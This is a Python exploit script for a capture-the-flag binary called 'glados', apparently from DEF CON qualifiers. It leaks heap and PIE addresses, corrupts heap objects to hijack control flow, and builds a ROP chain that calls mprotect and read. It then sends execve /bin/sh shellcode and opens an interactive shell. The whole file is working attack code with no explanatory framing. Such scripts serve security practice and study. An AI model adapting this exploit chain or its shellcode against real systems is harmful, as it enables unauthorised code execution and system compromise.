import pwnbox,struct
s = lambda x : struct.pack("<Q",x)
p = pwnbox.pipe.ProcessPipe("./glados",logging=True)
#p = pwnbox.pipe.SocketPipe("glados_750e1878d025f65d1708549693ce5d5d.quals.shallweplayaga.me",9292)
cnt = 1
def menu():
  p.read_until(": ")

def add_core(name,ty,g=True):
  global cnt
  cnt +=1
  p.read_until("Selection:")
  p.write("1\n")
  p.read_until("Selection:")
  p.write("%d\n"%ty)
  if g:
    p.read_until("Selection:")
    p.write("5\n")
    p.read_until("Number:")
    p.write("%d\n"%cnt)
    p.read_until("?")
    l = len(name)+1
    p.write("%d\n"%l)
    if ty ==7:
      p.read_until("Selection:")
      p.write("5\n")
      p.read_until("Number:")
      p.write("%d\n"%cnt)
      p.read_until("Selection:")
      p.write("2\n")
      p.read_until("\n")
      p.write(name+"\n")

def leak(n):
  p.read_until("Selection:")
  p.write("5\n")
  p.read_until("Number:")
  p.write("2\n")
  p.read_until("Selection:")
  p.write("2\n")
  p.read_until("Entry:")
  p.write("%d\n"%n)
  p.read_until("Value: ")
  return p.read_until("\n")

def del_core(n):
  global cnt
  p.read_until("Selection:")
  p.write("4\n")
  p.read_until("Number:")
  p.write("%d\n"%n)
  cnt -=1


add_core("AAAA",3)
heap = int(leak(-3)) & 0xfffffffffffff000
pie  = (int(leak(-4)) & 0xfffffffffffff000)-0x235000
free_obj = heap+0x7a0
print hex(heap),hex(pie)
add_core((s(0))*30+s(free_obj)*50,7)
del_core(3)
add_core("B"*0x100,7,True)
add_core("D"*3,7,False)
add_core("E"*3,7,False)
del_core(4)
add_core("F"*3,7,False)

target = heap+0x910
RIP = pie+0x1e4a
fj = ""
fj += s(heap+0x7c0)+s(heap+0x8f0)
fj += s(0)+s(0x23)
fj += s(pie+0x235a70)+s(0x100)
fj += s(target)+s(0x111)
fj += s(RIP)*10
fj += "\x00"*(256-len(fj))
"""WRITE  """
p.read_until("Selection:")
p.write("5\n")
p.read_until("Number:")
p.write("3\n")
p.read_until("Selection:")
p.write("2\n")
p.read_until("\n")
p.write(fj+"\n")
p.read_until("Selection:")
p.write("5\n")
p.read_until("Number:")
p.write("5\n")
p.read_until("Selection:")
p.write("2\n")
p.write(s(free_obj+0x60)*(0x100/8))
prdx = pie+0x12aa8
prdi = pie+0x2229
prsi = pie+0x2ff0
rdx =7
rsi = 0x1000
rdi = heap
mprotect =pie+0x1f5f 
print hex(rdi)
print "prdi : %x"%prdi
rop  = "A"*40
rop += s(prdx)
rop += s(rdx)
rop += s(prsi)
rop += s(rsi)
rop += s(0)
rop += s(prdi)
rop += s(rdi)
rop += s(mprotect)

rdx = 0x100
rsi = heap
rdi = 0

read = pie + 0x1fef
rop += s(prdx)
rop += s(rdx)
rop += s(prdi)
rop += s(rdi)
rop += s(prsi)
rop += s(rsi)
rop += s(0)
rop += s(read)
rop += s(heap)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = shellcode.ljust(0x100,"\x90")
p.write(rop+"\n")
p.write(shellcode+"\n")
p.interact()
